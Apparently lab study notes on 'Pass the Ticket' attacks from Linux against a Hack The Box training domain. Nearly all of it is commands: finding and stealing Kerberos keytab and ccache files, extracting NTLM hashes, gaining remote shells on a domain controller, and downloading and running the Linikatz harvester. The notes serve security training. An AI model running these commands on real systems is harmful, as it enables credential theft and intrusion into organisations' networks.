# Pass the Ticket form Linux
```table-of-contents
```
## Ticket Storage & Discovery
### Storage Formats
| **Type** | **Description**                                                                                  | **Location (Default)**                       |
| -------- | ------------------------------------------------------------------------------------------------ | -------------------------------------------- |
| `CCache` | Credential Cache. Stores TGTs for active sessions. Temporary.                                    | `/tmp/krb5cc_%UID%`                          |
| `Keytab` | Key Table. Stores encrypted keys (derived from passwords). Persistent. Used by services/scripts. | `/etc/krb5.keytab` (System) or custom paths. |
### Enumeration
```shell
# Check domain status
realm list

# Check for AD integration processes
ps -ef | grep -i "winbind\|sssd"
```
### Finding Tickets
**Searching for Keytabs:** Look for `.keytab` files or scripts that reference them (often used in Cronjobs).
```shell
# Find keytab files
find / -name *keytab* -ls 2>/dev/null

# Check cronjobs for kinit usage
crontab -l
cat /etc/crontab
```

**Searching for CCache:** Look in `/tmp` for files following the naming convention `krb5cc_UID_RANDOM`.
```shell
ls -la /tmp
env | grep KRB5CCNAME
```
## Abusing Keytab Files
### Impersonation (kinit)
1. **Identify the Principal:** Use `klist` to see who the keytab belongs to. 
2. **Import:** Use `kinit`.
```shell
# List principals in the keytab
klist -k -t /opt/specialfiles/carlos.keytab

# Impersonate (Note: REALM must be UPPERCASE)
kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab

# Verify access
smbclient //dc01/carlos -k -c ls
```
### Hash Extraction (KeyTabExtract)
```shell
# Tool: KeyTabExtract.py
python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab

# Output example:
# NTLM HASH : a738f92b3c08b424ec2d99589a9cce60
```
## Abusing CCache Files
### Harvesting & Impersonating
1. **Copy** the target ccache file to your workspace. 
2. **Export** the `KRB5CCNAME` environment variable to point to that file.
```shell
# 1. Steal the ticket (as root)
cp /tmp/krb5cc_647401106_I8I133 /root/stolen_ticket

# 2. Set environment variable
export KRB5CCNAME=/root/stolen_ticket

# 3. Verify
klist

# 4. Use (Example: Dumping DC C$ share)
smbclient //dc01/C$ -k -c ls -no-pass
```
## Using Tickets (Tooling)
### Impacket
```shell
# Syntax: impacket-wmiexec <Target_Hostname> -k -no-pass
proxychains impacket-wmiexec dc01 -k -no-pass
```
### Evil-WinRM
```shell
# Install package
sudo apt-get install krb5-user

# Connect
proxychains evil-winrm -i dc01 -r inlanefreight.htb
```
## Ticket Conversion
**Tool:** `impacket-ticketConverter`
```shell
# Convert Linux ccache to Windows kirbi (for Mimikatz/Rubeus)
impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi

# Convert Windows kirbi to Linux ccache
impacket-ticketConverter julio.kirbi julio.ccache
```
## Automated Harvesting (Linikatz)
**Linikatz** is a script that automates the discovery and extraction of Kerberos credentials (similar to Mimikatz but for Linux). It requires root.
```shell
wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
bash linikatz.sh
```